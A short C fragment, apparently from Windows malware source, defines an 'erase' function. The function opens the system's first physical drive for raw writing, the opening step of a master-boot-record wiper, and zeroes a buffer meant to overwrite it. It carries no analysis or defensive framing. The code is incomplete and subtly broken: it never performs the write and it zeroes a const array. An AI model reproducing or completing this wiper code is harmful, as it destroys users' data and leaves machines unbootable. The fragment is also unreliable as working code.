
int erase(){
  DWORD wrote;
  HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

  const char biden[BUFF_SIZE];
  ZeroMemory(biden, BUFF_SIZE);
  
}
